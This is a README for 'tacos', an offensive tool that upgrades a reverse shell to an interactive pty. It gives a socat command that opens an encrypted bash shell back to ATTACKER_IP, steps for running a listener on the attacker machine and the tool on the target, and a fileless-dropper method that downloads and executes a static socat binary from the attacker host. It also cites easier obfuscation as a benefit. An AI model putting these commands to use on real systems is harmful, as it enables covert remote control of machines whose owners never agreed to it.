# tacos 🌮 
<sup>(reverse `socat`)</sup>

<div align=center>
<img src=https://github.com/ariary/tacos/blob/main/logo.png width=250>
</div>

Spawn a pty in your reverse shell to automaticaly make it interactive.

Equivalent of:
```shell
socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP:PORT],verify=0
```

**Why ?**
* too lazy to copy/paste/learn socat command
* target doesn't have `socat` and you don't want to do [this](#alternative)
* provide more advanced configuration to the tty (alias, etc)
* easier to obfuscate
* cross-platform (to do) 


## Usage

`tacos` is built to work with the simple and dramatically effective project [`pty4all`](https://github.com/laluka/pty4all):
```shell
# On attacker machine
tmux
./light-pty4all/socat-listener.sh --lport [ATTACKER_PORT] #multi-handler

# On target (transfer tacos as you wish)
./tacos [ATTACKER_IP]
# 💥
```

## Alternative

Alternatively, if target does not have `socat`:
**Host** a [static](https://github.com/minos-org/minos-static/blob/master/static-get) version of `socat` binary and **download + execute it** using the stealthy  [`filess-xec`](https://github.com/ariary/fileless-xec) dropper:
```shell
# On attacker machine
# get socat static & expose it
get-static socat
python3 -m http.server 8080

# On target machine
# Use already downloaded fileless-xec to download socat and stealthy launch it with argument
fileless-xec [ATTACKER_IP]:8080/socat -- exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP]:443,verify=0
```
